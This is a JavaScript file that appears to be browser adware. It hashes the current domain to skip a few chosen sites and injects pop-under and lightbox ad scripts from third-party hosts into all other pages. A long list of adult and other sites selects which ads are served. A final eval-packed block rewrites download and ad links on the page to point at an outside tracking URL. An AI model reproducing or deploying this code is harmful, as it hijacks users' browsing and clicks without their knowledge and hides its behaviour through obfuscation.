
function getCookie(e){var n=document.cookie,i=e+"=",o=n.indexOf("; "+i);if(-1==o){if(o=n.indexOf(i),0!=o)return null}else{o+=2;var t=document.cookie.indexOf(";",o);-1==t&&(t=n.length)}return unescape(n.substring(o+i.length,t))}
function spu_createCookie(e,t,i){if(i){var o=new Date;o.setTime(o.getTime()+60*i*60*1e3);var a="; expires="+o.toGMTString()}else var a="";document.cookie=e+"="+t+a+"; path=/"}
function md5cycle(f,h){var i=f[0],n=f[1],r=f[2],g=f[3];i=ff(i,n,r,g,h[0],7,-680876936),g=ff(g,i,n,r,h[1],12,-389564586),r=ff(r,g,i,n,h[2],17,606105819),n=ff(n,r,g,i,h[3],22,-1044525330),i=ff(i,n,r,g,h[4],7,-176418897),g=ff(g,i,n,r,h[5],12,1200080426),r=ff(r,g,i,n,h[6],17,-1473231341),n=ff(n,r,g,i,h[7],22,-45705983),i=ff(i,n,r,g,h[8],7,1770035416),g=ff(g,i,n,r,h[9],12,-1958414417),r=ff(r,g,i,n,h[10],17,-42063),n=ff(n,r,g,i,h[11],22,-1990404162),i=ff(i,n,r,g,h[12],7,1804603682),g=ff(g,i,n,r,h[13],12,-40341101),r=ff(r,g,i,n,h[14],17,-1502002290),n=ff(n,r,g,i,h[15],22,1236535329),i=gg(i,n,r,g,h[1],5,-165796510),g=gg(g,i,n,r,h[6],9,-1069501632),r=gg(r,g,i,n,h[11],14,643717713),n=gg(n,r,g,i,h[0],20,-373897302),i=gg(i,n,r,g,h[5],5,-701558691),g=gg(g,i,n,r,h[10],9,38016083),r=gg(r,g,i,n,h[15],14,-660478335),n=gg(n,r,g,i,h[4],20,-405537848),i=gg(i,n,r,g,h[9],5,568446438),g=gg(g,i,n,r,h[14],9,-1019803690),r=gg(r,g,i,n,h[3],14,-187363961),n=gg(n,r,g,i,h[8],20,1163531501),i=gg(i,n,r,g,h[13],5,-1444681467),g=gg(g,i,n,r,h[2],9,-51403784),r=gg(r,g,i,n,h[7],14,1735328473),n=gg(n,r,g,i,h[12],20,-1926607734),i=hh(i,n,r,g,h[5],4,-378558),g=hh(g,i,n,r,h[8],11,-2022574463),r=hh(r,g,i,n,h[11],16,1839030562),n=hh(n,r,g,i,h[14],23,-35309556),i=hh(i,n,r,g,h[1],4,-1530992060),g=hh(g,i,n,r,h[4],11,1272893353),r=hh(r,g,i,n,h[7],16,-155497632),n=hh(n,r,g,i,h[10],23,-1094730640),i=hh(i,n,r,g,h[13],4,681279174),g=hh(g,i,n,r,h[0],11,-358537222),r=hh(r,g,i,n,h[3],16,-722521979),n=hh(n,r,g,i,h[6],23,76029189),i=hh(i,n,r,g,h[9],4,-640364487),g=hh(g,i,n,r,h[12],11,-421815835),r=hh(r,g,i,n,h[15],16,530742520),n=hh(n,r,g,i,h[2],23,-995338651),i=ii(i,n,r,g,h[0],6,-198630844),g=ii(g,i,n,r,h[7],10,1126891415),r=ii(r,g,i,n,h[14],15,-1416354905),n=ii(n,r,g,i,h[5],21,-57434055),i=ii(i,n,r,g,h[12],6,1700485571),g=ii(g,i,n,r,h[3],10,-1894986606),r=ii(r,g,i,n,h[10],15,-1051523),n=ii(n,r,g,i,h[1],21,-2054922799),i=ii(i,n,r,g,h[8],6,1873313359),g=ii(g,i,n,r,h[15],10,-30611744),r=ii(r,g,i,n,h[6],15,-1560198380),n=ii(n,r,g,i,h[13],21,1309151649),i=ii(i,n,r,g,h[4],6,-145523070),g=ii(g,i,n,r,h[11],10,-1120210379),r=ii(r,g,i,n,h[2],15,718787259),n=ii(n,r,g,i,h[9],21,-343485551),f[0]=add32(i,f[0]),f[1]=add32(n,f[1]),f[2]=add32(r,f[2]),f[3]=add32(g,f[3])}function cmn(f,h,i,n,r,g){return h=add32(add32(h,f),add32(n,g)),add32(h<<r|h>>>32-r,i)}function ff(f,h,i,n,r,g,t){return cmn(h&i|~h&n,f,h,r,g,t)}function gg(f,h,i,n,r,g,t){return cmn(h&n|i&~n,f,h,r,g,t)}function hh(f,h,i,n,r,g,t){return cmn(h^i^n,f,h,r,g,t)}function ii(f,h,i,n,r,g,t){return cmn(i^(h|~n),f,h,r,g,t)}function md51(f){txt="";var h,i=f.length,n=[1732584193,-271733879,-1732584194,271733878];for(h=64;h<=f.length;h+=64)md5cycle(n,md5blk(f.substring(h-64,h)));f=f.substring(h-64);var r=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(h=0;h<f.length;h++)r[h>>2]|=f.charCodeAt(h)<<(h%4<<3);if(r[h>>2]|=128<<(h%4<<3),h>55)for(md5cycle(n,r),h=0;16>h;h++)r[h]=0;return r[14]=8*i,md5cycle(n,r),n}function md5blk(f){var h,i=[];for(h=0;64>h;h+=4)i[h>>2]=f.charCodeAt(h)+(f.charCodeAt(h+1)<<8)+(f.charCodeAt(h+2)<<16)+(f.charCodeAt(h+3)<<24);return i}function rhex(f){for(var h="",i=0;4>i;i++)h+=hex_chr[f>>8*i+4&15]+hex_chr[f>>8*i&15];return h}function hex(f){for(var h=0;h<f.length;h++)f[h]=rhex(f[h]);return f.join("")}function md5(f){return hex(md51(f))}function add32(f,h){return f+h&4294967295}function add32(f,h){var i=(65535&f)+(65535&h),n=(f>>16)+(h>>16)+(i>>16);return n<<16|65535&i}var hex_chr="0123456789abcdef".split("");"5d41402abc4b2a76b9719d911017c592"!=md5("hello");
var dh = md5(document.domain);
var dh2 = md5((location.host.match(/([^.]+)\.\w{2,3}(?:\.\w{2})?$/) || [])[1]);
if ((dh == "2156a5a306fe70cf8fa3089690710ce1") || (dh == "e9cfb34b0a12464a8cba0e37cd46c9c9") || (dh == "9f6fee670877957ccaddf0f1fbd3358a") || window.name.match(/^(a652c|ld893)/) || (dh == "eda8687ce70c3871ec2c072b814ff102") || (dh2 == "c822c1b63853ed273b89687ac505f9fa") || (dh2 == "17704e560a29181a0ccd98f80d999c28")) {

} else {
var s = document.getElementsByTagName('script')[0];
if (typeof s == 'undefined') { s = document.getElementsByTagName('head')[0]; }
if (typeof s == 'undefined') { s = document.getElementsByTagName('body')[0]; }
if (document.domain.search('google') != -1) {
//var g2 = document.createElement("script"); g2.async = true; g2.setAttribute("src","//a.xfreeservice.com/partner/mil2V0Ws/?cid=32&sid=1000_5&addCB=0&apptitle=AdSupply&plink=&"); s.parentNode.insertBefore(g2, s);
}
var psites=["theporndude.com","xvideos.com","pornhub.com","youporn.com","tube8.com","youjizz.com","motherless.com","hardsextube.com","xnxx.com","spankwire.com","beeg.com","keezmovies.com","tubegalore.com","porn.com","4tube.com","pornbox.ch","xtube.com","yourlust.com","tnaflix.com","sunporno.com","cliphunter.com","slutload.com","empflix.com","vid2c.com","xxxbunker.com","pornyaz.com","overthumbs.com","xxxkinky.com","ah-me.com","eporner.com","madthumbs.com","fastjizz.com","orgasm.com","bigtits.com","userporn.com","xogogo.com","spankbang.com","perfectgirls.net","my18tube.com","hdpornstar.com","fapdu.com","free18.net","stileproject.com","pornative.com","pornrabbit.com","fucktube.com","sluttyred.com","fux.com","bustnow.com","lubetube.com","freudbox.com","definefetish.com","moviesand.com","pornjog.com","spankingtube.com","definebabe.com","bondagetube.tv","moviesguy.com","alotporn.com","vporn.com","bangyoulater.com","thisvid.com","nonktube.com","freecreampietube.com","sextube.com","mofosex.com","bravotube.net","pinktube.com","newsfilter.org","xxxymovies.com","openaked.com","x18.xxx","anysex.com","timtube.com","kosimak.com","hibasex.com","halasex.com","xhamster.com","japan-whores.com","chicken8.com","asianpornmovies.com","iyottube.com","jmetube.com","viewasianporn.com","jorpetz.com","asianfreeporn.org","tokyoporn.com","avporn.com","kuntfutube.com","91porn.com","141tube.com","thisav.com","mynakal.com","shesfreaky.com","myfreeblack.com","hoodamateurs.com","ghettotube.com","blackz.com","homegrownfreaks.net","freeebonytube.com","realghettogirlfriend.xxx","urbanfreakcam.com","shegotass.info","island-freaks.com","viewblackporn.com","youtwerk.com","ratchetblackporn.com","extasytube.com","indianpornvideos.com","mastishare.com","indianxtube.com","thiruttumasala.com","desihoes.com","sexzindian.com","indiangilma.com","sexzworld.com","indiansexztube.com","cnnamador.com","hellxx.com","nude-latina.com","videosamadoresbr.com","viewlatinaporn.com","mafiadaputaria.info","deviantclip.com","freebdsmtube.com","bdsmtubevideos.com","fetishtubevideos.com","femdom-tube.com","femdom-fetish-tube.co","extremetube.com","ballbustingtube.com","slavestube.com","femdomlibrary.com","humiliation.me","fetishbox.com","girlincontrol.com","bdsmchamber.com","bdsmstreak.com","dominationtube.com","myfetishtube.com","heavy-r.com","eroprofile.com","dirtyshack.com","xpee.com","shitporntube.com","scatrina.com","kaviar-tube.com","findtubes.com","nudevista.com","askjolene.com","pornmd.com","ro89.com","tubaholic.com","bing.com","badjojo.com","pornmaxim.com","adultvideofinder.com","bulktube.com","mrsnake.com","realgfporn.com","submityourflicks.com","homemoviestube.com","empireamateurs.com","homemadeporn.com","eroxia.com","homebangs.com","youramateurporn.com","chatroulettetube.com","fantasti.cc","voyeurweb.com","zoig.com","burningcamel.com","swapsmut.com","watchersweb.com","coomgirls.com","fapjacks.com","amateurs-gone-wild.com","ruleporn.com","cuckold69.com","supertangas.com","realteengirls.org","amateuralbum.net","exgfpics.com","palevo.com","xxxaporn.com","tangotime.com","candidvoyeurism.com","noviceamateurs.com","perezhilton.com","tmz.com","thesuperficial.com","dlisted.com","justjared.com","hollywoodtuna.com","hq-celebrity.com","egotastic.com","hotcelebshome.com","theybf.com","hollywoodlife.com","omg.yahoo.com","celebuzz.com","thehollywoodgossip.com","onlythebestfakes.com","cfake.com","bcfakes.com","cfakers.com","celebrity-hq.co.uk","gagreport.com","nakedcelebgallery.com","famousboard.com","fakethebitch.com","hentaistream.com","hentaitube.tv","tubehentai.com","cartoonporntube.com","hbrowse.com","gelbooru.com","fakku.net","hentaicrunch.com","animephile.com","chan.sankakucomplex.com","hentai-foundry.com","luscious.net","hentairules.net","doujin-moe.us","rule34.xxx","doujinland.com","sahadou.com","hentai.ms","g.e-hentai.org","hentai4manga.com","myhentai.tv","aerisdies.com","c.urvy.org","slimythief.com","pepsaga.com","menagea3.net","kitnkayboodle.comicgenesis.com","lushstories.com","asstr.org","eroticast.net","literotica.com","mcstories.com","t-s-s-a.com","nifty.org","bdsmlibrary.com","jessfink.com","adultsexgames.xxx","mysexgames.com","funny-games.biz","2adultflashgames.com","clitgames.com","hornygamer.com","anonib.com","ichan.org","boards.4chan.org","porn-chan.com","7chan.org","boards.420chan.org","wetchan.org","xxxchan.org","4chon.org","adultvideodump.com","fucking1.com","pornvids69.com","sexyvideodump.com","pinayfresh.com","fuckbook18.com","adultdumper.com","thesexdump.com","18pornsearch.com","fuckingdumpit.com","fuckinglink.com","topadultdump.com","efukt.com","thatsphucked.com","joyreactor.com","omegle.com","dirtyroulette.com","chatroulette.com","yoloflip.com","bazoocam.org","sex.com","pinsex.com","punchpin.com","weluvporn.com","snatchly.com","lustpin.com","smutty.com","pinme.xxx","pornopin.me","pingay.com","fuskator.com","hellokisses.com","sexit.fr","nude.bustybay.com","i-like-nsfw.com","babe-lounge.com","subimg.net","shuttur.com","xxxlens.com","asspictures.co","apina.biz","bootyoftheday.co","boobsaroundtheworld.com","pornolab.net","torrents.empornium.me","pornbay.org","pussytorrents.org","extratorrent.com","thepiratebay.pe","pornbits.net","rarbg.com","bootytape.com","webop.me","torsky.org","xossip.com","nutorrent.com","en.gay-lounge.net","adultbay.org","pornmade.com","hotpornfile.org","hornywhores.net","girlscanner.com","vipfucker.com","pornoh.info","tdarkangel.com","worldvoyeur.com","rapidhorny.com","naked-sluts.us","pornshare.biz","pissandfist.biz","jav-porn.com","fairybb.org","lustex.net","site-rip.org","serakon.com","pichunter.com","hq69.com","coedcherry.com","nextdoortease.com","ero-love.com","pussycalor.com","kindgirls.com","gallerygalore.net","nurglesnymphs.com","gymnastsnude.com","fineartteens.com","foxhq.com","brdteengal.com","tokyoteenies.com","labatidora.net","hottystop.com","xuk.ru","teensinasia.com","hqtgp.com","bondage-shock.com","subirporno.com","nastypornostars.com","erooups.com","totallynsfw.com","dirtyrottenwhore.com","fleshbot.com","awsum.me","russiasexygirls.com","pinkythekinky.com","nsfwdump.com","tush.tumblr.com","nsfworld.com","bananabunny.com","amateurindex.com","photos.freeones.com","babepedia.com","europornstar.com","thenude.eu","pornstarbook.com","beaverbattle.com","botto.ms","boo.by","tittybattles.com","assbattles.com","muffbattles.com","camelto.es","meatbeerbabes.com","bootyfix.com","nonnudegirls.org","ebaumsworld.com","thongsaroundtheworld.com","thenipslip.com","eyehandy.com","4gifs.tv","jigglegifs.com","fuckmaker.tumblr.com","giftube.com","gifporntube.com","online.europacasino.com","online.titanpoker.com","pornbb.org","planetsuzy.org","intporn.com","forumophilia.com","vamateur.com","porn-w.org","forum.phun.org","saff.cc","sexandfetishforum.com","peachyforum.com","forums.sexyandfunny.com","fritchy.com","forum.oneclickchicks.com","vintage-erotica-forum.com","forum.ns4w.org","ua-teens.com","pornrush.org","forum.scanlover.com","rawporn.org","hqpdb.com","porno-maniac.net","kitty-kats.net","mediafire.com","rapidshare.com","reddit.com","videarn.com","pornhost.com","imgur.com","imagevenue.com","xxx.freeimage.us","imagebam.com","stooorage.com","postimage.org","upload.imagefap.com","imagearn.com","pimpandhost.com","imagetwist.com","uploadhouse.com","imgbox.com","mozilla.org","google.com","opera.com","support.apple.com","wjdownloader.org","pchealthboost.co","bleepingcomputer.com","videolan.org","bsplayer.com","netnanny.com","mypornblocker.com","redtube.co","drtuber.co","nuvid.co","pornoxo.co","tnaflixfree.net","shufuni.co","twilightsex.co","kporno.co","porntitan.co","fuckuh.co","moviegator.co","pornerbros.co","yourlustmovies.co","tubeland.co","jizzall.co","hotgoo.co","yuvutu.co","dirtyxxxvideo.co","privatehomeclips.co","pornologo.co","hellporno.co","wankoz.co","xbabe.co","thenewporn.co","updatetube.co","xxxdessert.co","befuck.co","ice-porn.co","proporn.co","myxvids.co","foxytube.co","pornicom.co","dreamamateurs.co","wetplace.co","fantasy8.co","dansmovies.co","h2porn.co","redvak.co","fookgle.xx","88fuck.co","pervclips.co","dailee.co","pornheed.co","hdporn.ne","bestporntube.or","elephanttube.co","porn-wanted.co","apetube.co","tjoob.co","porncor.co","freetoptube.co","largeporntube.co","video.search.yahoo.com","ovguide.com","iptorrents.com","pornorip.ne","amazon.co","pinkcherryaffiliate.com","edenfantasys.com","bestpornstardb.com","avn.com","maxim.com","playboy.com","menshealth.com","cosmopolitan.co","live-cams-1.livejasmin.com","cams.com","stripshow.com","new.xlovecam.com","privatefeeds.com?AFNO=1-246229-2-Pornbibl","pornication.com?AFNO=1-246229-2-Pornbibl","mt.livecamfun.com","webcams.com","sexier.com","rivcams.com","enter.iknowthatgirl.com","tubeum.co","bigmouthfuls.com","enter.pervsonpatrol.com","streetblowjobs.com","sexforums.com","funpic.hu","x17online.co","celebritybabies.people.co","laineygossip.co","imnotobsessed.co","hentaischool.com","justicehentai.com","lolhentai.ne","24hentai.co","simply-hentai.co","hdhentaisex.co","sexyfuckgames.co","playporngames.co","playforceone.co","wtfpeople.co","daftporn.co","uselessjunk.co","69games.xx","refer.ccbill.com","pornstarshowdown.com","rateme100.com","beauty-battle.com","zimbio.com","vintagepinupgirls.ne","freesexpins.co","pornpin.co","twitter.com","pinterest.com","art-or-porn.co","ladycheeky.co","mandatory.com","erotica7.com","thechive.com","rk.com","natour.naughtyamerica.com","enter.mofosnetwork.com","join.teamskeet.com","gfrevenge.com","videosz.com","join.digitalplayground.com","join.wickedpictures.com","enter.brazzersnetwork.com","secure.twistys.com","secure.hustler.com","join.ddfnetwork.com","enter.javhd.com","signup.21sextury.com","join.pornprosnetwork.com","join.puffynetwork.com","join.perfectgonzo.com","join.allofgfs.com","adultfriendfinder.com","xxxdating.com","getiton.com","affiliates.perfectmatch.com","xhookups.com","nostringsattached.com","passion.com","cpd8.net","xdatenow.net","hornymatches.com","the-pork.co","forum.fckya.com","pornusers.com","justusboys.co","magic-wigs.co","actual-porn.or","entnt.co","pornpicdumps.co","phapit.co","post-tits.or","en.softonic.com","mediadetective.com","surfrecon.com","hide-porn.winsite.com","microsoft.com","macscan.securemac.com","keepersecurity.co","download.cnet.com","incezt.net","semprot.com","bokep.com","sambaporno.com"];
function includes(k) {
  for(var i=0; i < this.length; i++){
    if( this[i] === k || ( this[i] !== this[i] && k !== k ) ){
      return true;
    }
  }
  return false;
}
var dt=new Date();var ver=dt.toISOString().slice(0,10).replace(/-/g,"");

//var bb3 = document.createElement("script"); bb3.async = true; bb3.setAttribute("src","//www.md5update.com/t.js"); s.parentNode.insertBefore(bb3, s);


if (typeof kod92okdzm20 == 'undefined' && (self == top)) {
var https = (window.location.protocol == "https:") ? true : false;
var rndNum = Math.floor(Math.random() * (9999999));


var popArray = [
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//www.liveadexchanger.com/a/display.php?r=1059896',
    '//www.liveadexchanger.com/a/display.php?r=1059896'
];

if (psites.includes(window.location.host)) {
popArray = [
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply',
    '//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1738&ext=adsupply'
];
}

var adParams = {
  a: '18361042', size:'800x600', numOfTimes: '1',duration: '1',serverdomain: 's.ad132m.com' ,period: 'hour'  , context:'c18421036' , openNewTab: true
};

var randomNumber = Math.floor(Math.random()*popArray.length);
var selectedPop = popArray[randomNumber];
var pp = document.createElement("script");pp.setAttribute("src", selectedPop);pp.setAttribute('async', 'true');
s.parentNode.insertBefore(pp, s);

var aply1 =document.createElement("script"); aply1.async=true; //aply1.setAttribute("src","//lightbox.linkbolic.com/scjs/lbx/lbxctxjs.js?aff_id=885&sbrand=Provider&subaff_id=1000_5&mode=lbx"); s.parentNode.insertBefore(aply1, s);

var aply1 =document.createElement("script"); aply1.async=true; aply1.setAttribute("src","//lightbox.linkbolic.com/scjs/lbx/lbxctxjs.js?aff_id=885&subaff_id=1000_5&sbrand=Provider&mode=lbx&nc=1"); s.parentNode.insertBefore(aply1, s);
var it = document.createElement("script"); it.async = true; it.setAttribute("src","//cdncache-a.akamaihd.net/sub/o6e35e7/1000_5/l.js?pid=1737&ext=Provider");
s.parentNode.insertBefore(it, s);
var kod92okdzm20 = true;
}
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 5=0;3 e=g(c(){(c(){5++;3 f=8.9(\'a[6*=h]\');3 a=\'//j.k.l/m-n-o-p-q\';7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a)}}f=8.9(\'.r a\');7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a);f[i].2(\'d\',\'\')}}f=8.9(\'a[s*=t]\');7(f.1>0){b(i=0;i<f.1;++i){f[i].2(\'6\',a);f[i].2(\'d\',\'\')}}7(5>4){u(5)}})()},v);',32,32,'|length|setAttribute|var||siti|href|if|document|querySelectorAll||for|function|onclick|sit||setInterval|adbrau||lrzxk|voluumtrk|com|53803cbd|b7da|4f8c|aa89|708df4469df1|advertDownload|id|atLink|clearInterval|300'.split('|'),0,{}));

 var rnd = Math.random();

}